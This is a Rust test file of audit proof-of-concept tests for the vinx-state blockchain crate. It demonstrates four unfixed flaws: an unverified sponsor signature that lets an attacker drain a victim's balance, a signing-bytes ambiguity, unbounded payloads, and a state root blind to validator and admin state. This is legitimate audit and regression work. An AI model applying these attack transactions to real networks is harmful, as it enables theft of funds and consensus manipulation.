//! Preuves de concept de l'audit de sécurité (docs/AUDIT_SECURITE_2026-09.md).
//!
//! ATTENTION : chaque test ci-dessous **affirme la PRÉSENCE d'une vulnérabilité**.
//! Il passe tant que la faille existe et échouera dès qu'elle sera corrigée — c'est
//! voulu : au moment du correctif, inverser l'assertion pour en faire un test de
//! non-régression. Marqués `#[ignore]` pour ne pas bloquer la CI ; les exécuter avec
//! `cargo test -p vinx-state --test audit_poc -- --ignored`.
use vinx_core::amount::{Amount, DEFAULT_FEE_FLOOR_ATOMS};
use vinx_core::{Transaction, TransactionType};
use vinx_crypto::{Address, KeyPair};
use vinx_state::{create_genesis_state, GenesisConfig, WorldState};

fn state_with(accounts: &[(Address, u128)]) -> WorldState {
    let v = Address::from_public_key(&KeyPair::generate().public_key());
    let mut s = create_genesis_state(&GenesisConfig {
        admin_address: v,
        validator_address: v,
        chain_id: vinx_core::CHAIN_ID_DEVNET,
    });
    for (a, bal) in accounts {
        s.credit_emit_for_test(*a, Amount::from_atoms(*bal));
    }
    s
}

/// FINDING: sponsor signature is never verified on the mempool-admission /
/// trusted-apply path. An attacker drains an arbitrary victim account.
#[test]
#[ignore = "asserts the presence of an unfixed vulnerability"]
fn poc_sponsor_signature_never_checked() {
    let attacker = KeyPair::generate();
    let attacker_addr = Address::from_public_key(&attacker.public_key());
    let victim = Address::from_public_key(&KeyPair::generate().public_key());
    let victim_balance = 5_000 * vinx_core::amount::DECIMAL_FACTOR;

    let mut s = state_with(&[
        (attacker_addr, 10 * vinx_core::amount::DECIMAL_FACTOR),
        (victim, victim_balance),
    ]);

    // Attacker builds a sponsored transfer of 0 VinX whose "fee" is the victim's
    // whole balance. No sponsor keypair is available — sponsor_signature is None.
    let mut tx = Transaction {
        tx_type: TransactionType::Transfer,
        from: attacker_addr,
        to: attacker_addr,
        amount: Amount::ZERO,
        fee: Amount::from_atoms(victim_balance),
        nonce: 0,
        chain_id: vinx_core::CHAIN_ID_DEVNET,
        expires_at_height: None,
        payload: vec![],
        pub_key: Some(attacker.public_key()),
        signature: None,
        sponsor: Some(victim),
        sponsor_pub_key: None,
        sponsor_signature: None,
    };
    tx.sign(&attacker); // only the ATTACKER signs

    // 1. mempool stateful admission accepts it
    assert!(
        s.admission_check(&tx).is_ok(),
        "admission_check accepted the unsigned-sponsor tx"
    );
    // 2. the trusted apply path (used by the block producer for mempool txs) applies it
    s.apply_transaction_trusted(&tx).expect("trusted apply");

    assert_eq!(
        s.account_balance(&victim),
        Amount::ZERO,
        "victim drained without ever signing"
    );
    // The full-verification path would have caught it:
    assert!(WorldState::verify_tx_signature_pure(&tx).is_err());
}

/// FINDING: `signing_bytes` is ambiguous at the payload/sponsor boundary — the
/// payload carries no length prefix, so `payload || 0x01 || sponsor(20)` can be
/// re-parsed as `payload' || 0x00` whenever the sponsor address ends in 0x00.
/// One signature is then valid for two different transactions with the same txid.
#[test]
#[ignore = "asserts the presence of an unfixed vulnerability"]
fn poc_signing_bytes_payload_sponsor_ambiguity() {
    let sender = KeyPair::generate();
    let from = Address::from_public_key(&sender.public_key());
    let to = Address::from_public_key(&KeyPair::generate().public_key());

    // A sponsor address whose last byte is 0x00 (1 address in 256).
    let mut sponsor_bytes = [0x7au8; 20];
    sponsor_bytes[19] = 0x00;
    let sponsor = Address::from_bytes(sponsor_bytes);

    let fee = Amount::from_atoms(DEFAULT_FEE_FLOOR_ATOMS);
    let mut sponsored = Transaction::new_transfer(&sender, to, Amount::from_vinx(1), fee, 0);
    sponsored.sponsor = Some(sponsor);
    sponsored.signature = Some(sender.sign(&sponsored.signing_bytes()));

    // Re-split the same preimage: no sponsor, payload absorbs the sponsor marker.
    let mut resplit = sponsored.clone();
    resplit.sponsor = None;
    let mut payload = vec![1u8];
    payload.extend_from_slice(&sponsor_bytes[..19]);
    resplit.payload = payload;

    assert_eq!(
        sponsored.signing_bytes(),
        resplit.signing_bytes(),
        "two distinct transactions share one signature preimage"
    );
    assert_eq!(sponsored.hash(), resplit.hash(), "and therefore one txid");
    assert!(
        WorldState::verify_tx_signature_pure(&resplit).is_ok(),
        "the re-split variant carries a valid sender signature"
    );

    // Economic difference: the fee payer changed from the sponsor to the sender.
    let mut s = state_with(&[
        (from, 1_000 * vinx_core::amount::DECIMAL_FACTOR),
        (sponsor, 1_000 * vinx_core::amount::DECIMAL_FACTOR),
    ]);
    let before_sender = s.account_balance(&from);
    s.apply_transaction_trusted(&resplit).expect("re-split applies");
    assert!(
        s.account_balance(&from) < before_sender.checked_sub(Amount::from_vinx(1)).unwrap(),
        "the sender, not the sponsor, paid the fee"
    );
    assert_eq!(
        s.account_balance(&sponsor).atoms(),
        1_000 * vinx_core::amount::DECIMAL_FACTOR
    );
}

/// FINDING: no upper bound on `Transaction::payload` anywhere in validation.
#[test]
#[ignore = "asserts the presence of an unfixed vulnerability"]
fn poc_unbounded_payload_accepted() {
    let kp = KeyPair::generate();
    let from = Address::from_public_key(&kp.public_key());
    let to = Address::from_public_key(&KeyPair::generate().public_key());
    let fee = Amount::from_atoms(DEFAULT_FEE_FLOOR_ATOMS);
    let mut tx = Transaction::new_transfer(&kp, to, Amount::from_vinx(1), fee, 0);
    tx.payload = vec![0xABu8; 4 * 1024 * 1024]; // 4 MiB of free ballast
    tx.signature = Some(kp.sign(&tx.signing_bytes()));

    let mut s = state_with(&[(from, 1_000 * vinx_core::amount::DECIMAL_FACTOR)]);
    assert!(s.admission_check(&tx).is_ok(), "4 MiB payload admitted");
    s.apply_transaction(&tx)
        .expect("4 MiB payload applied for the minimum fee");
}

/// FINDING: `compute_state_root` hashes only (address, balance, nonce, staked).
/// The validator set, the BLS/VRF key registry, the admin authority, the epoch
/// beacon, pending unbonds and the whole `validator_pool` are OUTSIDE the
/// commitment — two nodes can hold irreconcilable consensus state and still
/// publish the same `state_root`.
#[test]
#[ignore = "asserts the presence of an unfixed vulnerability"]
fn poc_state_root_does_not_commit_to_consensus_state() {
    let honest_validator = Address::from_public_key(&KeyPair::generate().public_key());
    let attacker = Address::from_public_key(&KeyPair::generate().public_key());
    let user = Address::from_public_key(&KeyPair::generate().public_key());

    let mut a = state_with(&[(user, 1_000 * vinx_core::amount::DECIMAL_FACTOR)]);
    let mut b = a.clone();

    // `b` swaps the entire validator set and the admin key; accounts are untouched.
    b.validator_set = vinx_core::ValidatorSet::single(attacker);
    b.admin_address = Some(attacker);
    b.admin_policy = None;
    b.epoch_beacon = [0xFF; 32];
    b.validator_pool.insert(
        attacker,
        vinx_core::ValidatorPoolEntry::new(1_000_000, 0),
    );
    b.min_validator_bond_atoms = 1;
    b.active_set_size = 5;

    a.validator_set = vinx_core::ValidatorSet::single(honest_validator);

    assert_eq!(
        a.compute_state_root(),
        b.compute_state_root(),
        "state_root is blind to the validator set, admin key, pool and beacon"
    );
}
